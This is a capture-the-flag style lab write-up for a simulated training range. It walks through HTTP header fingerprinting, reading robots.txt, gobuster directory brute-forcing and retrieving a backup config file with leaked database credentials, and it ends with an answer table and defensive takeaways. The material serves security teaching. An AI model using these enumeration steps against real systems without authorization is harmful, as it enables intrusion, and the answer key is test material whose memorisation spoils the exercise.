# Lab 01 — Web Enumeration & Hidden Content

**Category:** Web / Reconnaissance
**Target:** `http://10.10.10.5`
**Environment:** TechBiz Security Academy — simulated practice range

## Objectives
- Fingerprint a web server from its headers
- Read `robots.txt`
- Brute-force directories with gobuster
- Find and read the exposed backup file
- Locate the hidden admin panel

## Methodology

### 1. Fingerprint via HTTP headers
```bash
curl -I http://10.10.10.5
```
Response:
```
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```
The `Server` header discloses the web server software; `X-Powered-By` leaks the server-side language directly — a header that should be suppressed in production.

### 2. Read `robots.txt`
```bash
curl http://10.10.10.5/robots.txt
```
Output:
```
User-agent: *
Disallow: /admin-portal/
Disallow: /backup/
```
Ironically, disallowing crawlers from a path is a strong signal to a human attacker about exactly where to look.

### 3. Brute-force directories
```bash
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x zip,sql,bak,txt,tar,gz
```
Confirmed live paths: `/admin-portal`, `/login.php`, `/uploads`, `/backup`, `/css`, `/images`.

### 4. Locate and read the backup file
Scoped brute-forcing into `/backup/` with narrower extensions per the lab's hint (`bak,old,txt`) didn't surface a listing, so the exact filename was pulled from the lab's hint system:
```bash
curl http://10.10.10.5/config.php.bak
```
Output:
```php
<?php
// LEGACY BACKUP - DELETE ME
$DB_HOST = 'localhost';
$DB_USER = 'intranet_app';
$DB_PASS = 'Summer2024!';
// TBS{backup_files_leak_creds}
```

## Answers
| Q | Question | Answer |
|---|---|---|
| q1 | Web server software | `Apache` |
| q2 | Server-side language | `PHP` |
| q3 | Hidden admin panel path | `/admin-portal` |
| q4 | Database password leaked | `Summer2024!` |
| q5 | Flag | `TBS{backup_files_leak_creds}` |

## Takeaways
- `robots.txt` frequently discloses the exact paths an operator wanted hidden.
- Backup files with predictable extensions (`.bak`, `.old`) left inside the webroot are a recurring, low-effort source of credential disclosure.
- `X-Powered-By` and verbose `Server` headers give an attacker free reconnaissance — both should be stripped or minimized in production configs.
